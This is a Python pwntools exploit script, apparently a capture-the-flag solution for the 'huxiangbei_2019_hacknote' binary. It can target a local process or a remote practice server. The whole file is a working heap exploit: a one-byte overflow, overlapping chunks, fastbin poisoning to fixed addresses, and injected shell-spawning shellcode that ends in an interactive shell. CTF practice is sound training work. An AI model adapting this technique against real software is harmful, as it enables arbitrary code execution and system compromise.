import sys
from pwn import *
context.log_level='debug'
context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./huxiangbei_2019_hacknote')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./huxiangbei_2019_hacknote')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',27884)
			elf=ELF('./huxiangbei_2019_hacknote')
			#libc=ELF('')

		def add(a,b):
			io.sendlineafter('-----------------\n','1')
			io.sendlineafter('Input the Size:\n',str(a))
			io.sendafter('Input the Note:\n',b)

		def edit(a,b):
			io.sendlineafter('-----------------\n','3')
			io.sendlineafter(':\n',str(a))
			io.sendafter('Input the Note:\n',b)

		def delete(a):
			io.sendlineafter('-----------------\n','2')
			io.sendlineafter(':\n',str(a))

		add(0x48,'a'*0x48)
		add(0x48,'a'*0x48)
		add(0x48,'a'*0x48)
		add(0x48,p64(0)+p64(0x41)+'\n')	
		edit(0,'a'*0x48)
		edit(0,'a'*0x48+'\xa1')
		delete(1)
		delete(2)
		add(0x98,'a'*0x48+p64(0x51)+p64(0x61)+'\n')
		add(0x48,'\n')
		delete(1)
		add(0x98,'a'*0x48+p64(0x61)+p64(0x61)+'\n')
		delete(1)
		delete(2)
		add(0x98,'a'*0x48+p64(0x61)+p64(0x6cb818)+'\n')
		add(0x58,'\n')
		add(0x58,'\x00'*0x30+p64(0x6ccbe0)+'\n')
		add(0x67,asm(shellcraft.sh())+'\n')
		edit(4,'\x00'*0x30+p64(0x6cb778)+'\n')
		add(0x67,p64(0x6ccbf0)+'\n')
		#add(0x50,'aaa')




		
		
		#gdb.attach(io)
		#pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue